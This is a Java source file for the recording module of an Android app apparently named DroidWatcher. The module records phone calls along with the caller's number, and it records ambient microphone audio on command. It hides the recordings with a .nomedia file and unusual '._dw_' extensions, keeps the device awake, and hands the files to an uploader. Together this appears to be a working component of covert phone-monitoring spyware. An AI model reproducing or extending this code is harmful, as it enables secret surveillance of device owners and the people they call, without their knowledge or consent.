package com.droidwatcher.modules;

import java.lang.ref.WeakReference;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedList;
import java.util.Locale;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.FileSender;
import com.droidwatcher.FileSender.FileType;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.FileUtil;
import android.annotation.SuppressLint;
import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

@SuppressLint("InlinedApi")
public class RecorderModule {
	private Context mContext;
	private SettingsManager mSettings;
	private LinkedList<RecordTask> mQueue;
	private RecordTask mCurrentTask;
	private MediaRecorder mRecorder;
	private WakeLock mWakeLock;
	
	private static MyHandler sHandler;
	public static final int START_RECORD_CALL = 1;
	public static final int STOP_RECORD_CALL = 2;
	public static final int START_RECORD_REQUEST = 3;
	public static final int STOP_RECORD_REQUEST = 4;
	public static final int RESTART_RECORD_CALL = 5;
	public static final int STOP_RECORD = 6;
	
	private static final long RECORD_INTERVAL = 10 * 60 * 1000L;
	private static final long RECORD_MIN_VALUE = 10 * 1000L;
	
	public static final String CALL_PREFIX = "[call]";
	public static final String RECORD_PREFIX = "[record]";
	
	public static Boolean isRecording = false;
	
	public RecorderModule(Context context){
		mContext = context;
		mQueue = new LinkedList<RecordTask>();
		mCurrentTask = null;
		mSettings = new SettingsManager(context);
		PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
		mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DW_RECORDED_WAKELOCK");
		sHandler = new MyHandler(this);
		isRecording = false;
	}
	
	public void dispose(){
		try {
			Debug.i("[RecorderModule] dispose");
			
			if (mQueue != null) {
				mQueue.clear();
			}
			
			if (mCurrentTask != null) {
				stopRecord();
			}
			
			if (sHandler != null) {
				sHandler.removeMessages(STOP_RECORD_REQUEST);
			}
			
			releaseWakeLock();
			
			isRecording = false;
			
		} catch (Exception e) {
			ACRA.getErrorReporter().handleSilentException(e);
			Debug.exception(e);
			
		} finally {
			mQueue = null;
			mCurrentTask = null;
			sHandler = null;
			mWakeLock = null;
		}
	}
	
	private void acquireWakeLock(){
		try {
			if (mWakeLock == null) {
				PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
				mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DW_RECORDED_WAKELOCK");
			}
			if (mWakeLock != null && !mWakeLock.isHeld()) {
				mWakeLock.acquire();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	private void releaseWakeLock(){
		try {
			if (mWakeLock != null && mWakeLock.isHeld()) {
				mWakeLock.release();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	@SuppressWarnings("deprecation")
	private void startRecord(RecordTask task){
		if (!FileUtil.isExternalStorageAvailable() || !FileUtil.hasExternalStorageFreeMemory() || task == null){
			return;
		}
		
		Debug.i("[RecorderModule] startRecord; Thread name: " + Thread.currentThread().getName());
		
		acquireWakeLock();
		
		FileUtil.createNomedia(mContext);
		
		try {
			if (mRecorder == null) {
				Debug.i("[RecorderModule] new MediaRecorder()");
				mRecorder = new MediaRecorder();
			}
			
			int source = mSettings.recordSource();
			if (!task.isCall) {
				if (source != MediaRecorder.AudioSource.CAMCORDER && source != MediaRecorder.AudioSource.DEFAULT && source != MediaRecorder.AudioSource.MIC) {
					source = MediaRecorder.AudioSource.MIC;
				}
			}
			
			mRecorder.setAudioSource(source);
			
			String format = "";
			switch (mSettings.recordFormat()) {
			case 1:
				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				format = "._dw_3gp";
				break;
			case 3:
				mRecorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
				format = "._dw_amr";
				break;
			case 6:
				if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
					mRecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
					format = "._dw_aac";
				}
				else{
					mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					format = "._dw_3gp";
				}
				
				break;
			default:
				return;
			}
			
			Date dt = new Date();
			String date = SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.SHORT, SimpleDateFormat.SHORT, new Locale("ru","RU")).format(dt);
			date = date.replace(':', '-');//.replace(' ', '_');
			
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.append(task.isCall ? CALL_PREFIX : RECORD_PREFIX);
			if (task.isCall) {
				stringBuilder.append('[').append(task.num).append(']');
			}
			stringBuilder
				.append('[').append(date).append(']')
				.append('[').append(dt.getTime()).append(']').append(format);
			
			String filePath = FileUtil.getExternalFullPath(mContext, stringBuilder.toString());
			mRecorder.setOutputFile(filePath);
			mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
			mRecorder.setAudioChannels(1);
			mRecorder.prepare();
			mRecorder.start();
			
			isRecording = true;
			mCurrentTask = task;
			mCurrentTask.startedAt = dt.getTime();
			
			if (task.isCall) {
				sHandler.sendEmptyMessageDelayed(RESTART_RECORD_CALL, RECORD_INTERVAL);
			}
			else{
				sHandler.sendEmptyMessageDelayed(STOP_RECORD_REQUEST, task.ms);
			}
			
		} catch (Exception e) {
			//ACRA.getErrorReporter().handleSilentException(e);
			//ErrorHandler.error(e, mContext);
			Debug.exception(e);
			stopRecord();
		}
	}
	
	private void restartRecord(){
		sHandler.removeMessages(STOP_RECORD_REQUEST);
		sHandler.removeMessages(RESTART_RECORD_CALL);
		
		stop();
		startRecord(mCurrentTask);
	}
	
	private void stopRecord(){
		sHandler.removeMessages(STOP_RECORD_REQUEST);
		sHandler.removeMessages(RESTART_RECORD_CALL);
		
		stop();
		
		mCurrentTask = null;
		
		if (mQueue.isEmpty()) {
			release();
			new FileSender(mContext, FileType.RECORD).start();
		}
		else{
			startRecord(mQueue.poll());
		}
	}
	
	private void stop(){
		isRecording = false;
		
		try {
			mRecorder.stop();
			mRecorder.reset();
			
		} catch (Exception e) {
			Debug.exception(e);
			mRecorder = null;
		}
	}
	
	private void release(){
		if (mRecorder != null) {
			try {
				mRecorder.release();
				
			} catch (Exception e) {
				Debug.exception(e);
				
			} finally{
				mRecorder = null;
			}
		}
		
		releaseWakeLock();
	}
	
	private void pauseRecord(){
		sHandler.removeMessages(STOP_RECORD_REQUEST);
		
		stop();
		
		long remainingTime = mCurrentTask.ms - (new Date().getTime() - mCurrentTask.startedAt);
		if (remainingTime > RECORD_MIN_VALUE) {
			mCurrentTask.ms = remainingTime;
			mQueue.addFirst(mCurrentTask);
		}
		
		mCurrentTask = null;
	}
	
	private synchronized void addTask(RecordTask task){
		if (task.isCall) {
			if (mCurrentTask != null && mCurrentTask.isCall) {
				return;
			}
			
			if (mCurrentTask != null) {
				pauseRecord();
			}
			
			startRecord(task);
		}
		else{
			while(task.ms > RECORD_MIN_VALUE){
				long ms = task.ms > RECORD_INTERVAL ? RECORD_INTERVAL : task.ms;
				mQueue.add(new RecordTask(ms));
				task.ms -= ms;
			}
			
			if (mCurrentTask == null && !mQueue.isEmpty()) {
				startRecord(mQueue.poll());
			}
		}
	}
	
	public static void message(Message msg){
		if (sHandler != null) {
			sHandler.sendMessage(msg);
		}
	}
	
	private synchronized void handleMessage(Message msg){
		Debug.i("[RecorderModule] handle message: " + msg.what);
		switch (msg.what) {
		case START_RECORD_CALL:
			addTask(new RecordTask(msg.obj));
			break;
		case STOP_RECORD_CALL:
			if (mCurrentTask != null && mCurrentTask.isCall) {
				stopRecord();
			}
			break;
		case START_RECORD_REQUEST:
			addTask(new RecordTask(msg.arg1));
			break;
		case STOP_RECORD_REQUEST:
			if (mCurrentTask != null && !mCurrentTask.isCall) {
				stopRecord();
			}
			break;
		case RESTART_RECORD_CALL:
			if (mCurrentTask != null && mCurrentTask.isCall) {
				restartRecord();
			}
			break;
		case STOP_RECORD:
			if (mCurrentTask != null) {
				mQueue.clear();
				stopRecord();
			}
			break;
		default:
			return;
		}
	}
	
	private class RecordTask{
		public Boolean isCall;
		public String num;
		public long ms;
		public long startedAt;
		
		public RecordTask(Object num){
			this.isCall = true;
			this.num = "no number";
			if (num != null) {
				this.num = (String) num;
			}
		}
		
		public RecordTask(int seconds){
			this.isCall = false;
			this.num = "";
			this.ms = seconds * 1000L;
			if (this.ms < RECORD_MIN_VALUE) {
				this.ms = RECORD_MIN_VALUE;
			}
		}
		
		public RecordTask(long ms){
			this.isCall = false;
			this.num = "";
			this.ms = ms;
		}
	}
	
	private static class MyHandler extends Handler{
		private final WeakReference<RecorderModule> mModule;
		
		public MyHandler(RecorderModule module) {
	        mModule = new WeakReference<RecorderModule>(module);
	    }
		
		@Override
        public void handleMessage(Message msg) {
			RecorderModule module = mModule.get();
			if (module != null) {
				module.handleMessage(msg);
			}
		}
	}
}
